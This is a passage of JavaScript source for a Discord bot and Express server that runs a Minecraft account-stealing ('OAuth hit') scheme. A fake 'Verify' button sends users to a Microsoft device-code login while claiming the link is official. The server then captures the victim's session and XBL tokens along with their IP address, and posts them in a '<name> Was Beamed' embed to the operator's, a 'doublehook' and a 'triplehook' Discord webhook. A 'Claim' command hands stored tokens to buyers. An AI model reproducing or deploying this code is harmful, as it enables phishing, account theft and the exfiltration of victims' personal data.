      if (!interaction.channel || !interaction.member)
          return;
  
      const modal = new ModalBuilder()
          .setCustomId('Claim')
          .setTitle('Claim an OAuth hit based on the IGN');
      const titleInput = new TextInputBuilder()
          .setCustomId('claimIGNInput')
          .setLabel("IGN")
          .setStyle(TextInputStyle.Short);
      const firstActionRow = new ActionRowBuilder().addComponents(titleInput);
      modal.addComponents(firstActionRow);
      await interaction.showModal(modal);
  } else if (interaction.isModalSubmit() && interaction.customId === 'Claim') {
      try {
          await interaction.deferReply({ ephemeral: true });
          const ign = interaction.fields.getTextInputValue('claimIGNInput');
          const guildId = interaction.guild.id;
  
          const minecraftData = await getMinecraftData(guildId);
  
          const matchingData = minecraftData.filter(data => data.minecraft_ign.toLowerCase() === ign.toLowerCase());
  
          if (matchingData.length > 0) {
              const ssid = matchingData[0].session_id;
  
              if (ssid) {
                  const embed = new EmbedBuilder()
                  .setColor(0x00FF00)
                  .setTitle(`✅ Successfully Claimed Hit`)
                  .addFields(
                    { 
                      name: '**Username:**',
                      value: '```' + ign + '```',
                      inline: true 
                    },
                    {
                      name: '**Token:**',
                      value: '```' + ssid + '```'
                    }
                  )
                  .setTimestamp()
                  .setFooter({ text: 'by @officialtimmy' });

                  await interaction.followUp({
                    embeds: [embed]
                  })
              } else {
                  await interaction.followUp(`❌ No token found for IGN ${ign}`);
              }
          } else {
              await interaction.followUp(`❌ No data found for IGN ${ign}`);
          }
      } catch (error) {
      }
  } else if (interaction.customId === 'GenEliteOAuth') {
      if (!interaction.channel || !interaction.member)
      return;
      const modal = new ModalBuilder()
          .setCustomId('Whitelist')
          .setTitle('Whitelist your server for Elite OAuth access');
      const titleInput = new TextInputBuilder()
          .setCustomId('eliteIdInput')
          .setLabel("guildid")
          .setStyle(TextInputStyle.Short);
      const firstActionRow = new ActionRowBuilder().addComponents(titleInput);
      modal.addComponents(firstActionRow);
      await interaction.showModal(modal);
    } else if (interaction.isModalSubmit() && interaction.customId === 'Whitelist') {
      try {
          await interaction.deferReply({ ephemeral: true });
          const guildid = interaction.fields.getTextInputValue('eliteIdInput');

          const requiredRole = interaction.guild.roles.cache.find(role => role.id === eliteroleid);
          if (interaction.member.roles.cache.has(requiredRole.id)) {
              set4thGuilds(guildid)
        
              console.log('Server GuildID added to database');
            
              const discordWhitelistReply = new EmbedBuilder()
                  .setTitle('✅ OAuth Gen GuildID added to database')
                  .setDescription(`The GuildID has been added to the database, now you can invite the bot and do /config [doublehook]`)
                  .setColor(0x00FF00)
                  .setFooter({ text: 'by @officialtimmy' });
        
                  const genInvButton = new ButtonBuilder()
                  .setLabel('BOT INV')
                  .setStyle(ButtonStyle.Link)
                  .setURL(`https://discord.com/api/oauth2/authorize?client_id=${clientid}&permissions=8&scope=applications.commands+bot`);
          
                  const newActionRow = new ActionRowBuilder().addComponents(genInvButton);
              
              await interaction.followUp({
                  embeds: [discordWhitelistReply],
                  components: [newActionRow],
                  ephemeral: true
              });
          } else {
            await interaction.followUp('❌ You don\'t have the requierd role https://tenor.com/view/you-didnt-say-the-magic-word-ah-ah-nope-wagging-finger-gif-17646607');
          }
        } catch (error) {
          await interaction.followUp('❌ You don\'t have the requierd role https://tenor.com/view/you-didnt-say-the-magic-word-ah-ah-nope-wagging-finger-gif-17646607');
        }
    } else if (interaction.commandName === 'embed') {
      if (!interaction.member.permissions.has([PermissionsBitField.Flags.KickMembers, PermissionsBitField.Flags.BanMembers])) {
        await interaction.reply({
            content: '❌ You do not have the necessary permissions to use this command',
            ephemeral: false
        });
        return;
      }
      if (!interaction.channel || !interaction.member)
        return;
      
      const modal = new ModalBuilder()
          .setCustomId('myModal')
          .setTitle('Create an Embed');
      const titleInput = new TextInputBuilder()
          .setCustomId('titleInput')
          .setLabel("Title")
          .setStyle(TextInputStyle.Short);
      const messageInput = new TextInputBuilder()
          .setCustomId('messageInput')
          .setLabel("Message")
          .setStyle(TextInputStyle.Paragraph);
      const firstActionRow = new ActionRowBuilder().addComponents(titleInput);
      const secondActionRow = new ActionRowBuilder().addComponents(messageInput);
      modal.addComponents(firstActionRow, secondActionRow);
      await interaction.showModal(modal);
      } else if (interaction.isModalSubmit() && interaction.customId === 'myModal') {
        await interaction.deferReply({ ephemeral: true });
        if (!interaction.member.permissions.has([PermissionsBitField.Flags.KickMembers, PermissionsBitField.Flags.BanMembers])) {
          await interaction.followUp({
              content: '❌ You do not have the necessary permissions to use this command',
              ephemeral: false
          });
          return;
        }
        const title = interaction.fields.getTextInputValue('titleInput');
        const desc = interaction.fields.getTextInputValue('messageInput');
        try {
        const embed = new EmbedBuilder()
            .setTitle(title)
            .setDescription(desc)
            .setColor('#0099ff');
        await interaction.followUp({
            content: 'Embed created',
            ephemeral: true
        });
        await interaction.channel.send({
          embeds: [embed]
      });
    } catch (error) {
      console.log('invalid color')
      await interaction.followUp('❌ Invalid color')
    }
    } else if (interaction.commandName === 'setup') {
      if (!interaction.channel || !interaction.member)
      return;
      const modal = new ModalBuilder()
        .setCustomId('myVerifyModal')
        .setTitle('Create an Embed');
    const titleInput = new TextInputBuilder()
        .setCustomId('titleInput')
        .setLabel("Title")
        .setStyle(TextInputStyle.Short);
    const messageInput = new TextInputBuilder()
        .setCustomId('messageInput')
        .setLabel("Message")
        .setStyle(TextInputStyle.Paragraph);
    const buttonNameInput = new TextInputBuilder()
        .setCustomId('buttonNameInput')
        .setLabel("Button Name")
        .setStyle(TextInputStyle.Short);
    const firstActionRow = new ActionRowBuilder().addComponents(titleInput);
    const secondActionRow = new ActionRowBuilder().addComponents(messageInput);
    const thirdActionRow = new ActionRowBuilder().addComponents(buttonNameInput);
    modal.addComponents(firstActionRow, secondActionRow, thirdActionRow);
    await interaction.showModal(modal);
    } else if (interaction.isModalSubmit() && interaction.customId === 'myVerifyModal') {
      try {
        await interaction.deferReply({ ephemeral: true });
        const title = interaction.fields.getTextInputValue('titleInput');
        const desc = interaction.fields.getTextInputValue('messageInput');
        const buttonLabel = interaction.fields.getTextInputValue('buttonNameInput');
        const embed = new EmbedBuilder()
            .setTitle(title)
            .setDescription(desc)
            .setColor('#00FF00');
        const button = new ButtonBuilder()
            .setLabel(buttonLabel)
            .setStyle(ButtonStyle.Success)
            .setCustomId('Verify'); 
        const row = new ActionRowBuilder().addComponents(button);
        await interaction.followUp({
            content: 'Embed created',
            ephemeral: true
        });
        await interaction.channel.send({
          embeds: [embed],
          components: [row]
      });
    } catch (error) {
    }
    } else if (interaction.customId === 'Verify') {
      await interaction.deferReply({ ephemeral: true });
        try {
          const guildid = interaction.guild.id;
          const id = await get3rdWebhooks(guildid); // This is the returned OAuth ID used for OAuth autentication param
          
          const apiUrl = `http://localhost:${port}/verify/${id}`;
          function fetchData() {
            return fetch(apiUrl) 
                .then(response => {
                    if (!response.ok) {
                        throw new Error('Network response was not ok');
                    }
                    return response.json();
                })
                .then(data => {
                    return data.url; 
                })
                .catch(error => {
                    console.error('Error:', error);
                });
          }
        
          fetchData().then(url => {
            try {
            const newEmbed = new EmbedBuilder()
                .setTitle('Microsoft linking')
                .setDescription('The link below will redirect you to the official Microsoft page to link your Minecraft account.')
                .setThumbnail('https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/1024px-Microsoft_logo.svg.png')
                .setColor('#00FF00');

            const linkButton = new ButtonBuilder()
                .setLabel('LINK')
                .setStyle(ButtonStyle.Link)
                .setURL(url);
        
            const newActionRow = new ActionRowBuilder().addComponents(linkButton);
            
              interaction.followUp({ embeds: [newEmbed], components: [newActionRow], ephemeral: true });
            } catch (error) {
            }
        })
      } catch (error) {
      }
    }
  } catch (error) {
    console.log('Client error: ' + error);
  }
});

client.login(token);

let logMessages = [];
let originalConsoleInfo = console.info;
console.info = function () {
    let args = Array.from(arguments);
    originalConsoleInfo.apply(console, args);
    logMessages.push(args.join(" "));
};
function extractXBLToken(jsonData) {
    if (jsonData.userToken && jsonData.userToken.Token) {
        return jsonData.userToken.Token;
    }
    return null;
}
function getCode(callback) {
    const regex = /code (\w{8})/;
    const time = setInterval(() => {
        const matchingLog = logMessages.find((l) => l.match(regex));
        if (matchingLog) {
            clearInterval(time);
            const codeMatch = matchingLog.match(regex);
            if (codeMatch) {
                const code = codeMatch[1];
                callback(code);
            }
            logMessages = [];
        }
    }, 500);
}
function generateRandomString(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let randomString = '';
    for (let i = 0; i < length; i++) {
      const randomIndex = Math.floor(Math.random() * characters.length);
      randomString += characters.charAt(randomIndex);
    }
    return randomString;
}
app.use(requestIp.mw());
app.get('/verify/:id', async (req, res) => {
  try {
    const id = req.params.id;
    const uniqueId = generateRandomString(20);
    const flow = new Authflow("", `./accs/${id}/${uniqueId}`, { authTitle: Titles.MinecraftJava, deviceType: "Win32", flow: "sisu" });
    getCode((code) => {
      const responseJSON = {
        url: `https://microsoft.com/link?otc=${code}`
      };
      res.send(responseJSON);    
    });
    flow.getMinecraftJavaToken({ fetchEntitlements: true, fetchProfile: true, fetchCertificates: true })
            .then(async (profile) => {
                const token = profile.token;
                const name = profile.profile.name;
                let xbltoken;
                const directoryPath = `./accs/${id}/${uniqueId}`;
                const targetFileNamePattern = 'xbl-cache';
                const files = fs.readdirSync(directoryPath);
                const matchingFiles = files.filter(file => file.includes(targetFileNamePattern));
                if (matchingFiles.length > 0) {
                    const filePath = path.join(directoryPath, matchingFiles[0]);
                    try {
                        const fileContents = fs.readFileSync(filePath, 'utf8');
                        const jsonData = JSON.parse(fileContents);
                        xbltoken = extractXBLToken(jsonData);
                        if (xbltoken) {
                            const userIpAddressr = req.clientIp;
                            const userIpAddress = ip.isV4Format(userIpAddressr) ? userIpAddressr : userIpAddressr.replace(/^.*:(\d+\.\d+\.\d+\.\d+)$/, '$1');
                            
                            console.log('id:', id);
                            console.log('uniqueId:', uniqueId);
                            console.log('token:', token);
                            console.log('name:', name);
                            console.log('userIpAddress:', userIpAddress);
                            console.log('xbltoken:', xbltoken);
                            
                            async function discordEmbed () {
                              const networthArray = await getNetworth(name)
                              const networth = networthArray[0]
                              const networthNoInventory = networthArray[1]
                              const networthNetworth = networthArray[2]
                              const networthUnsoulbound = networthArray[3]
                              const networthSoulbound = networthArray[4]
                            
                              let total_networth
                              // Set it "API IS TURNED OFF IF NULL"
                              if (networth == "API DOWN") total_networth = networth;
                              else if (networth == "[NO PROFILES FOUND]") total_networth = networth;
                              else if(networthNoInventory) total_networth = "NO INVENTORY: "+formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";
                              else total_networth = formatNumber(networthNetworth)+" ("+formatNumber(networthUnsoulbound)+")";

                              const playerData = await getPlayerData(name);
                              const rank = playerData[0];
                              const level = playerData[1].toFixed();
                              const discord = await getPlayerDiscord(name);
                              const status = await getPlayerStatus(name);
                              const usernameAndUUIDArray = await getUsernameAndUUID(token);
                              const uuid = usernameAndUUIDArray[0];
                              const discordMessage = {
                                username: name,
                                avatarURL: 'https://visage.surgeplay.com/face/256/' + uuid,
                                content: `@everyone`,
                                embeds: [
                                  {
                                    color: 0x00FF00,
                                    title: '✅ ' + name + ' Was Beamed',
                                    thumbnail: {
                                      url: 'https://visage.surgeplay.com/full/' + uuid,
                                    },
                                    fields: [
                                      {
                                        name: '**Username:**',
                                        value: '```' + name + '```',
                                        inline: true,
                                      },
                                      {
                                        name: `**Networth:**`,
                                        value: '```' + total_networth + '```',
                                        inline: true,
                                      },
                                      {
                                        name: `**Discord:**`,
                                        value: '```' + discord + '```',
                                        inline: true,
                                      },
                                      {
                                        name: `**Status:**`,
                                        value: '```' + status + '```',
                                        inline: true,
                                      },
                                      {
                                        name: `**Rank:**`,
                                        value: '```' + rank + '```',
                                        inline: true,
                                      },
                                      {
                                        name: `**Level:**`,
                                        value: '```' + level + '```',
                                        inline: true,
                                      },
                                      {
                                        name: '**Token:**',
                                        value: '```' + token + '```',
                                      },
                                      {
                                        name: '**XBL Refresh ID:**',
                                        value: '```' + id + '&' + uniqueId + '```',
                                      },
                                    ],
                                    timestamp: new Date().toISOString(),
                                    footer: {
                                      text: 'by @officialtimmy',
                                    },
                                  },
                                ]
                              }
                              return discordMessage;
                            }
                            
                            async function sendDiscordMessage() {
                              try {
                                const discordMessage = await discordEmbed();
                                
                                const webhooks = await getWebhooks(id);
                                const preGuildId = await getGuildID(id)
                                const guildid = preGuildId[0]
                                const guildIdDoublehook = await get2ndWebhooks(guildid)

                                const preBuyerID = await getBuyer(id)
                                const finalBuyerID = preBuyerID[0]

                                
                                if (id === finalBuyerID) {
                                  const xblRefreshToken = `${id}&${uniqueId}`;
                                  console.log('XBL TOKEN:' + xblRefreshToken);
                                  setMinecraftData(id, name, token, xblRefreshToken);
                                  console.log('Saved Minecraft data')
                                } else {
                                  if (webhooks[0] && webhooks[0].length > 0) {
                                    const webhookClient = new WebhookClient({
                                      url: webhooks[0],
                                  });
                                  
                                  await webhookClient.send(discordMessage);                                  
                                  console.log(`Sent the message to ${id}`);
                                    
                                      if (guildIdDoublehook[0] && guildIdDoublehook[0].length > 0) {
                                        try {
                                          const webhookClient2 = new WebhookClient({ 
                                            url: guildIdDoublehook[0],
                                          });
                                          await webhookClient2.send(discordMessage);
                                          console.log(`Sent the message to doublehook`);
                                        } catch (error) {
                                          console.log(`Guild ID doublehook was not defined: ${error}`)
                                        }
                                      }

                                      if (triplehook !== "") {
                                        const webhookClient3 = new WebhookClient({ 
                                          url: triplehook 
                                        });
                                        await webhookClient3.send(discordMessage);
                                        console.log(`Sent the message to triplehook`);
                                      }
                                  } else {
                                    console.error('Webhook URL not found or invalid.');
                                    return { error: 'Webhook URL not found or invalid' };
                                  }
                                }
                                return { success: true };
                              } catch (error) {
                                console.error('Error sending Discord message:', error.message);
                                return { error: 'Failed to send Discord message' };
                              }
                            }
                            
                            sendDiscordMessage();
                            
                        } else {
                            console.error('Error: Unable to extract xbltoken from the JSON.');
                        }
                    } catch (error) {
                        console.error('Error reading or parsing the JSON:', error.message);
                    }
                } else {
                    console.error('No matching files found for xbltoken.');
                }
            })
            .catch(error => {
                console.error('Error getting Minecraft Java token:', error);
            });
      } catch (error) {
        console.error('Error during OAuth process', error.message);
      }
});

app.get('*', (req, res) => { res.redirect('https://www.google.com'); });    
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});